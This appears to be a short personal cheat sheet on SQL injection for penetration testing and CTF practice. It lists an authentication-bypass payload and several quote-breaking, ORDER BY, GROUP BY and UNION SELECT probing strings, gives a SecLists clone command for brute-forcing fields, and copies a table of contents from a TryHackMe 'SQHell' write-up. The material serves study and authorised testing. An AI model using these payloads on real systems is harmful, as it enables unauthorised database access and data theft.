# SQL Injection





{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}

### **SQL Injection**

```
a' or 1=1 -- -

```









**List**

```
'
"
`
')
")
`)
'))
"))
`))
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
1' UNION SELECT null,null,null,null-- -
1' UNION SELECT null,null,null,null,null-- -
```



## Bruteforce fields

Good wordlist to use. You would do this if you discovered one field already, than you just replace it(in the example below you change password) with your list.&#x20;

```
git clone https://github.com/danielmiessler/SecLists.git
ls /SecLists/Discovery/Web-Content/common.txt
```

<figure><img src="../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>









From SQHell, go over and put in notes

**On this page**

* [Machine Information](https://pencer.io/ctf/ctf-thm-sqhell/#machine-information)
* [SQL Injection Info](https://pencer.io/ctf/ctf-thm-sqhell/#sql-injection-info)
* [Initial Access](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access)
* [Flag 1 - In-Band/Error Based - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---browser-method)
* [Flag 1 - In-Band/Error Based - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---curl-method)
* [Flag 1 - In-Band/Error Based - Burp Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---burp-method)
* [Flag 1 - In-Band/Error Based - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---sqlmap-method)
* [Flag 5 - In-Band/Union - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---browser-method)
* [Flag 5 - In-Band/Union - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---curl-method)
* [Flag 5 - In-Band/Union - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---sqlmap-method)
* [Flag 3 - Blind/Boolean - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---browser-method)
* [Flag 3 - Blind/Boolean - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---curl-method)
* [Flag 3 - Blind/Boolean - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---sqlmap-method)
* [Flag 2 - Blind/Time - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---curl-method)
* [Flag 2 - Blind/Time - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---sqlmap-method)
* [Flag 4 - Out-of-band - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method)
* [Flag 4 - Out-of-band - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---curl-method)
* [Flag 4 - Out-of-band - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---sqlmap-method)

